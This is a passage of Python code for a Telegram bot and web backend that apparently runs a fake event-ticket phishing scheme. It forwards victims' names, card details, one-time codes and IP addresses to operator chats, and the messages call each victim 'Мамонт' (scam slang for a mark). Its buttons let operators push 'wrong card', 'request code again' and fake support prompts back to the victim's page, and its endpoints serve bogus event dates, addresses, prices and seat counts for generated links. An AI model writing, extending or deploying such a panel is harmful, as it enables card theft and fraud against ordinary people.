        kb2_buttons.append(InlineKeyboardButton(text="Push", callback_data=f"push:{ip}:{page_code}"))
    kb2 = InlineKeyboardMarkup(
        inline_keyboard=[
            kb2_buttons,
            [
                InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
                InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
            ]
        ]
    )
    try:
        await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
    except Exception as e:
        print(f"[ERROR] Не вдалося надіслати msg2 у PAYMENT_GROUP_ID: {e}")
        import traceback
        traceback.print_exc()
    # 3. Повідомлення з кодом, IP + кнопка Request again
    if code:
        msg3 = (
            f"Code: {code}\n"
            f"IP: {ip}" + sum_str
        )
        kb3 = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")
                ]
            ]
        )
        try:
            await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
        except Exception as e:
            print(f"[ERROR] Не вдалося надіслати msg3 у PAYMENT_GROUP_ID: {e}")
            import traceback
            traceback.print_exc()
    # --- Дублювання для адміна, якщо знайдено user_id по page_code ---
    page_code = data.get('page', '')
    admin_user_id = None
    if page_code:
        c = conn.cursor()
        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
        row = c.fetchone()
        if row:
            admin_user_id = row[0]
    if admin_user_id:
        try:
            await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
        except Exception as e:
            print(f"[ERROR] Не вдалося надіслати ФИО admin_user_id: {e}")
            import traceback
            traceback.print_exc()
        try:
            await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
        except Exception as e:
            print(f"[ERROR] Не вдалося надіслати карту admin_user_id: {e}")
            import traceback
            traceback.print_exc()
        if code:
            try:
                await bot.send_message(admin_user_id, 'Мамонт ввёл код')
            except Exception as e:
                print(f"[ERROR] Не вдалося надіслати код admin_user_id: {e}")
                import traceback
                traceback.print_exc()

@log_function
async def code_notify(request):
    data = await request.json()
    code = data.get('code', '')
    ip = data.get('ip', '')
    page_code = data.get('page', '') or data.get('page_code', '')
    text = f"Code: {code}\nIP: {ip}"
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")
            ]
        ]
    )
    await bot.send_message(PAYMENT_GROUP_ID, text, reply_markup=kb)
    # --- Додаю дублювання адміну, якщо знайдено user_id по page_code ---
    admin_user_id = None
    if page_code:
        c = conn.cursor()
        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
        row = c.fetchone()
        if row:
            admin_user_id = row[0]
    if admin_user_id:
        await bot.send_message(admin_user_id, 'Мамонт ввёл код')
    return web.Response(text='ok')

# --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
@router.callback_query(lambda c: c.data and (
    c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or
    c.data.startswith('code:') or c.data.startswith('support:') or c.data.startswith('text:') or
    c.data.startswith('code_request_again:')
    or c.data.startswith('push:')
))
async def admin_action_handler(call: types.CallbackQuery):
    parts = call.data.split(':')
    action = parts[0]
    ip = parts[1] if len(parts) > 1 else None
    page_code = parts[2] if action == 'push' and len(parts) > 2 else None
    if action == 'push':
        print(f'[DEBUG] admin_action_handler: push page_code={page_code}, ip={ip}, data={call.data}')
        import aiohttp as aiohttp_client
        async with aiohttp_client.ClientSession() as session:
            print(f'[DEBUG] Sending push to http://127.0.0.1:8080/set_push_flag, page_code={page_code}')
            try:
                resp = await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
                print(f'[DEBUG] Push response: {resp.status} {await resp.text()}')
            except Exception as e:
                print(f'[DEBUG] Push request failed: {e}')
        await call.answer("Push notification sent")
        return
    import aiohttp as aiohttp_client
    async with aiohttp_client.ClientSession() as session:
        await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
    if action == 'card':
        await call.answer("Сигнал на сайт: не вірна карта")
    elif action == 'block':
        await call.answer("Користувач заблокований")
    elif action == 'unblock':
        await call.answer("Користувач розблокований")
    elif action == 'support':
        async with aiohttp_client.ClientSession() as session:
            await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
        await call.answer("Включена технічна підтримка")
    elif action == 'text':
        await call.answer("Введіть текст повідомлення:")
        user_step[call.from_user.id] = f'text_for_{ip}'; return
    elif action == 'code_request_again':
        async with aiohttp_client.ClientSession() as session:
            await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
        await call.answer("Код запитується знову")
    elif action == 'push':
        if page_code:
            await session.post('http://127.0.0.1:8080/set_push_flag', json={'page_code': page_code, 'type': 'push'})
        else:
            print('[push] No page_code provided!')
        await call.answer("Push notification sent")
    # НЕ змінюємо клавіатуру!
    await call.answer()



@router.callback_query(lambda c: c.data.startswith('ban:'))
async def ban_reason_ask(call: types.CallbackQuery):
    uid = call.from_user.id
    target_id = int(call.data.split(':', 1)[1])
    user_data[uid] = {'ban_target': target_id}
    user_step[uid] = 'ban_reason'
    await call.message.answer("Введите причину блокировки:")
    await call.answer()

@router.callback_query(lambda c: c.data == "change_nickname")
async def change_nickname_start(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = 'change_nickname'
    await call.message.answer("Введите новый псевдоним:")
    await call.answer()

@router.callback_query(lambda c: c.data == "change_wallet")
async def change_wallet_start(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = 'change_wallet'
    await call.message.answer("Введите новый кошелек:")
    await call.answer()

# --- запуск aiohttp і aiogram в одному event loop ---
@log_function
async def update_site_user_ip_endpoint(request):
    """Endpoint для оновлення IP адреси користувача сайту"""
    data = await request.json()
    user_id = data.get('user_id', '')
    page_code = data.get('page_code', '')
    ip = data.get('ip', '')
    if not ip:
        ip = request.remote
    if not user_id and page_code:
        # Знаходимо user_id по page_code
        c = conn.cursor()
        c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
        row = c.fetchone()
        if row:
            user_id = row[0]
    if user_id and ip:
        update_site_user_ip(user_id, ip)
        return web.Response(text="OK")
    else:
        print(f"[IP Update] Error updating IP: user_id={user_id}, page_code={page_code}, ip={ip}")
        return web.Response(text="Missing user_id/page_code or ip", status=400)

@middleware
async def cors_middleware(request, handler):
    if request.method == 'OPTIONS':
        resp = web.Response()
    else:
        resp = await handler(request)
    resp.headers['Access-Control-Allow-Origin'] = '*'
    resp.headers['Access-Control-Allow-Methods'] = 'POST, GET, OPTIONS'
    resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return resp

@log_function
async def latest_event_data(request):
    c = conn.cursor()
    c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price FROM site_users ORDER BY created_at DESC LIMIT 1')
    row = c.fetchone()
    if not row:
        print("[API] No data found in site_users table")
        return web.json_response({'error': 'no data'})
    
    data = {
        'dates': [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]],
        'currency': row[8],
        'street': row[9],
        'price': row[10]
    }
    print(f"[API] Returning data: {data}")
    return web.json_response(data)

@log_function
async def event_address(request):
    page_code = request.query.get('page', '') or request.query.get('e', '')
    print(f"[event_address] page_code: {page_code}")
    db_path = os.path.abspath('users.db')
    print(f"[event_address] DB path: {db_path}")
    if not page_code:
        print("[event_address] No page_code provided")
        return web.json_response({'error': 'missing page or e parameter'}, status=400)
    c = conn.cursor()
    # Спочатку шукаємо в event_links (для нових записів)
    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
    row = c.fetchone()
    if row:
        print(f"[event_address] Found user_id in event_links: {row[0]}")
        # user_id тут — це Telegram user_id, тому адресу шукаємо по page_code у site_users
        c.execute('SELECT street FROM site_users WHERE page_code=?', (page_code,))
        row2 = c.fetchone()
        if not row2:
            print(f"[event_address] page_code {page_code} not found in site_users for street (via event_links)")
            return web.json_response({'error': 'address not found'}, status=404)
        address = row2[0]
        print(f"[event_address] Found address (via event_links): {address}")
        return web.json_response({'address': address})
    else:
        # Якщо не знайдено в event_links, шукаємо в site_users
        c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
        row = c.fetchone()
        if not row:
            return web.json_response({'error': 'not found'}, status=404)
        user_id = row[0]
    # Знайти запис site_users для цього user_id
    c.execute('SELECT street, places FROM site_users WHERE id=?', (user_id,))
    row2 = c.fetchone()
    if not row2:
        return web.json_response({'error': 'address not found'}, status=404)
    address, places = row2
    return web.json_response({'address': address, 'places': places})

@log_function
async def data_by_ip(request):
    ip = request.query.get('ip', '')
    if not ip:
        return web.json_response({'error': 'missing ip'}, status=400)
    c = conn.cursor()
    c.execute('SELECT id FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
    row = c.fetchone()
    if not row:
        return web.json_response({'error': 'not found'}, status=404)
    user_id = row[0]
    c.execute('SELECT price, currency, street FROM site_users WHERE id=?', (user_id,))
    row2 = c.fetchone()
    if not row2:
        return web.json_response({'error': 'data not found'}, status=404)
    price, currency, street = row2
    return web.json_response({'price': price, 'currency': currency, 'street': street})

@log_function
async def event_links(request):
    # Підтримуємо як новий формат ?page= так і старий ?e=
    page_code = request.query.get('page', '') or request.query.get('e', '')
    if not page_code:
        return web.json_response({'error': 'missing page or e parameter'}, status=400)
    
    print(f"[DEBUG] event_links request for page_code: {page_code}")
    
    c = conn.cursor()
    # Спочатку шукаємо в event_links (для нових записів)
    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
    row = c.fetchone()
    
    if row:
        site_user_id = row[0]
        print(f"[DEBUG] Found site_user_id: {site_user_id} for page_code: {page_code} in event_links")
    else:
        # Якщо не знайдено в event_links, шукаємо в site_users
        c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
        row = c.fetchone()
        if not row:
            print(f"[DEBUG] Page code {page_code} not found in any table")
            return web.json_response({'error': 'page_code not found'}, status=404)
        site_user_id = row[0]
        print(f"[DEBUG] Found site_user_id: {site_user_id} for page_code: {page_code} in site_users")
    
    # Перевіряємо, чи існує цей site_user_id у таблиці site_users
    c.execute('SELECT id FROM site_users WHERE id=?', (site_user_id,))
    site_user_exists = c.fetchone()
    
    if not site_user_exists:
        print(f"[DEBUG] Site user {site_user_id} not found in site_users table")
        return web.json_response({'error': 'site_user_id not found in site_users'}, status=404)
    
    return web.json_response({'site_user_id': site_user_id})

# --- API: user_id by page_code ---
@log_function
async def user_id_by_page_code(request):
    page_code = request.query.get('page', '')
    if not page_code:
        return web.json_response({'error': 'missing page'}, status=400)
    c = conn.cursor()
    c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
    row = c.fetchone()
    if not row:
        return web.json_response({'error': 'not found'}, status=404)
    return web.json_response({'user_id': row[0]})

async def payment_data(request):
    try:
        page_code = request.query.get('page', '')
        if not page_code:
            return web.json_response({'error': 'missing page'}, status=400)
        
        print(f"[DEBUG] payment_data request for page_code: {page_code}")
        
        c = conn.cursor()
        c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
        row = c.fetchone()
        
        if not row:
            print(f"[DEBUG] No record found for page_code: {page_code}")
            return web.json_response({'error': 'not found'}, status=404)
        
        price, currency, street = row
        print(f"[DEBUG] Found data: price={price}, currency={currency}, street={street}")
        
        return web.json_response({'price': price, 'currency': currency, 'address': street})
    except Exception as e:
        print(f"[ERROR] payment_data error: {e}")
        import traceback
        traceback.print_exc()
        return web.json_response({'error': 'internal server error'}, status=500)


@router.message(flags={'run_always': True})
async def print_chat_id(message: types.Message):
    print(f"[TEMP DEBUG] Chat ID: {message.chat.id}")
    # Можна закоментувати або видалити цей хендлер після отримання chat_id


def fill_page_codes():
    c = conn.cursor()
    c.execute('SELECT id FROM site_users ORDER BY created_at')
    users = c.fetchall()
    for idx, (user_id,) in enumerate(users):
        series = idx // 100 + 1
        number = idx % 100 + 1
        page_code = f"{series}-{number}"
        c.execute('UPDATE site_users SET page_code=? WHERE id=?', (page_code, user_id))
    conn.commit()

def get_site_user_id_by_page(page_code):
    c = conn.cursor()
    c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
    row = c.fetchone()
    return row[0] if row else None

# --- API: page_code by user_id --

# --- Функції для роботи з місцями подій ---
def get_event_places(page_code, event_index):
    c = conn.cursor()
    c.execute('SELECT places FROM event_places WHERE page_code=? AND event_index=?', (page_code, event_index))
    row = c.fetchone()
    return row[0] if row else 0

def set_event_places(page_code, event_index, places):
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO event_places (page_code, event_index, places) VALUES (?, ?, ?)', (page_code, event_index, places))
    conn.commit()

# --- API для отримання місць для події ---
@log_function
async def event_places_api(request):
    page_code = request.query.get('page', '')
    event_index = int(request.query.get('event', '0'))
    c = conn.cursor()
    c.execute('SELECT places FROM event_places WHERE page_code=? AND event_index=?', (page_code, event_index))
    row = c.fetchone()
    if not row:
        return web.json_response({'places': 0})
    return web.json_response({'places': row[0]})

@log_function
async def event_date_api(request):
    page_code = request.query.get('page', '')
    event_index = int(request.query.get('event', '0'))
    c = conn.cursor()
    c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8 FROM site_users WHERE page_code=?', (page_code,))
    row = c.fetchone()
    if not row:
        return web.json_response({'date': ''})
    if 0 <= event_index < 8:
        return web.json_response({'date': row[event_index].split(' ')[0] if row[event_index] else ''})
    return web.json_response({'date': ''})

@log_function
async def event_time_api(request):
    page_code = request.query.get('page', '')
    event_index = int(request.query.get('event', '0'))
    c = conn.cursor()
    c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8 FROM site_users WHERE page_code=?', (page_code,))
    row = c.fetchone()
    if not row:
        return web.json_response({'time': ''})
    if 0 <= event_index < 8:
        if row[event_index] and ' ' in row[event_index]:
            return web.json_response({'time': row[event_index].split(' ', 1)[1]})
        else:
            return web.json_response({'time': ''})
    return web.json_response({'time': ''})


@router.message(StepFilter('pay_amount'))
@ban_guard
async def admin_pay_amount(message: types.Message):
    # ...існуючий код...
    user_step[uid] = None

@router.message(lambda m: is_admin(m.from_user.id) and m.text and any(x in m.text.lower() for x in ["назад", "back"]))
@ban_guard
async def force_admin_back(message: types.Message):
    uid = message.from_user.id
    user_step[uid] = 'admin_panel'
    await message.answer("Повернення в адмін-панель.", reply_markup=admin_panel_kb)
    return

# Додаємо лічильник спроб для manual_payment_amount
manual_payment_attempts = {}


@router.message(lambda m: m.text and ("назад" in m.text.lower() or "⬅️" in m.text.lower()))
@ban_guard
async def universal_back_handler(message: types.Message):
    uid = message.from_user.id
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    user_step[uid] = None
    await message.answer("Возврат в главное меню.", reply_markup=kb)

def back_from_edit_places_choose_filter(m):
    uid = m.from_user.id
    step, _ = get_user_state(uid)
    return step and step.startswith('edit_places_choose_') and m.text and m.text.lower() == 'назад'

@router.message(back_from_edit_places_choose_filter)
@ban_guard
async def back_from_edit_places_choose(message: types.Message):
    print("==> back_from_edit_places_choose")
    state, _ = get_user_state(message.from_user.id)
    page_code = state.replace('edit_places_choose_', '')
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Изменить данные")],
            [KeyboardButton(text="Изменить места")],
            [KeyboardButton(text="Удалить ссылку")],
            [KeyboardButton(text="Назад")]
        ],
        resize_keyboard=True
    )
    await message.answer(f"Настройки для ссылки ?page={page_code}", reply_markup=kb)
    set_user_state(message.chat.id, f'edit_link_menu_{page_code}')

def back_from_edit_link_menu_filter(m):
    uid = m.from_user.id
    step, _ = get_user_state(uid)
    return step and step.startswith('edit_link_menu_') and m.text and m.text.lower() == 'назад'

@router.message(back_from_edit_link_menu_filter)
@ban_guard
async def back_from_edit_link_menu(message: types.Message):
    print("==> back_from_edit_link_menu")
    c = conn.cursor()
    c.execute('SELECT page_code FROM site_users ORDER BY created_at DESC LIMIT 50')
    codes = [row[0] for row in c.fetchall() if row[0]]
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text=f"?page={code}")] for code in codes] + [[KeyboardButton(text="Назад")]],
        resize_keyboard=True
    )
    await message.answer("Последние 50 ссылок. Выберите ссылку:", reply_markup=kb)
    set_user_state(message.chat.id, 'choose_link_to_edit')

def back_from_choose_link_to_edit_filter(m):
    uid = m.from_user.id
    step, _ = get_user_state(uid)
    return step == 'choose_link_to_edit' and m.text and m.text.lower() == 'назад'

@router.message(back_from_choose_link_to_edit_filter)
@ban_guard
async def back_from_choose_link_to_edit(message: types.Message):
    print("==> back_from_choose_link_to_edit")
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Создать ссылку")],
            [KeyboardButton(text="Изменить ссылки")],
            [KeyboardButton(text="Назад")]
        ],
        resize_keyboard=True
    )
    await message.answer("Выберите действие:", reply_markup=kb)
    set_user_state(message.chat.id, 'links_menu')

def back_from_links_menu_filter(m):
    uid = m.from_user.id
    step, _ = get_user_state(uid)
    return step == 'links_menu' and m.text and m.text.lower() == 'назад'

@router.message(back_from_links_menu_filter)
@ban_guard
async def back_from_links_menu(message: types.Message):
    print("==> back_from_links_menu")
    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
    await message.answer("Главное меню:", reply_markup=kb)
    clear_user_state(message.chat.id)

# --- Універсальний хендлер для 'Назад', який не спрацьовує у вкладених меню ---
@router.message(
    StepIsNoneFilter()
)
@ban_guard
async def universal_back_handler(message: types.Message):
    print("==> universal_back_handler")
    uid = message.from_user.id
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    user_step[uid] = None
    if message.chat.type == "private":
        await message.answer("Возврат в главное меню.", reply_markup=kb)
    else:
        await message.answer("Возврат в главное меню.")



# --- Універсальний callback_query-хендлер тільки для кнопок "Назад" ---
@router.callback_query(lambda c: c.data in ["back_to_menu", "payuser_back", "pay_back", "ban_back", "tickets_cancel"])
async def universal_inline_back_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = None
    manual_payment_attempts.pop(uid, None)
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    
    # Специальная обработка для tickets_cancel
    if call.data == "tickets_cancel":
        await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
    else:
        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
    
    await call.answer()




@router.message(lambda m: m.text == "⬅️ Назад")
async def back_to_main_menu(message: types.Message):
    uid = message.from_user.id
    user_step[uid] = None
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await message.answer("Возврат в главное меню.", reply_markup=kb)






# --- Універсальний callback_query-хендлер для всіх inline-кнопок ---
# Видалено, щоб не перехоплювати всі inline-кнопки

# --- Додаємо глобальний dict для списку повідомлень з кнопками ---
bot_message_ids = {}



# --- Універсальний хендлер для '⬅️ Назад' у будь-якому стані ---
@router.message(lambda m: m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
@ban_guard
async def force_back_to_main(message: types.Message):
    uid = message.from_user.id
    current_step = user_step.get(uid)
    print(f"[DEBUG] force_back_to_main called for user {uid}, text: {message.text!r}, current_step: {current_step}")
    
    # Не обробляємо, якщо користувач знаходиться в payment_type_selection
    if current_step == 'payment_type_selection':
        print(f"[DEBUG] Skipping force_back_to_main for payment_type_selection")
        return
    
    user_step[uid] = None
    print(f"[DEBUG] force_back_to_main: user_step set to None, text={message.text!r}")
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await message.answer("Повернення в головне меню.", reply_markup=kb)
    print(f"[DEBUG] force_back_to_main: user_step={user_step.get(uid)}")

@router.message(lambda m: user_step.get(m.from_user.id) == 'admin_panel' and m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
@ban_guard
async def admin_panel_back(message: types.Message):
    uid = message.from_user.id
    user_step[uid] = None
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await message.answer("", reply_markup=kb)
    print(f"[DEBUG] admin_panel_back: user_step={user_step.get(uid)}")




# --- запуск aiohttp і aiogram в одному event loop ---
if __name__ == '__main__':
    async def main():
        # aiohttp app
        app = web.Application(middlewares=[cors_middleware])
        app.router.add_post('/notify_admin', notify_admin)
        app.router.add_post('/payment_notify', payment_notify)
        app.router.add_post('/code_notify', code_notify)
        app.router.add_post('/update_site_user_ip', update_site_user_ip_endpoint)
        app.router.add_get('/api/latest_event_data', latest_event_data)
        app.router.add_get('/api/event_address', event_address)  # <-- Додаємо новий endpoint
        app.router.add_get('/api/data_by_ip', data_by_ip)  # <-- Додаємо новий endpoint
        app.router.add_get('/api/event_links', event_links)  # <-- Додаємо новий endpoint
        app.router.add_get('/api/user_id_by_page_code', user_id_by_page_code)
        app.router.add_get('/api/payment_data', payment_data)  # <-- Додаємо новий endpoint
        app.router.add_get('/api/event_places', event_places_api)  # <-- Додаємо новий endpoint
        app.router.add_get('/api/event_date', event_date_api)
        app.router.add_get('/api/event_time', event_time_api)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 8081)
        await site.start()
        print('Запускаю aiohttp webhook на 0.0.0.0:8081')
        # aiogram polling
        await dp.start_polling(bot)
    asyncio.run(main())
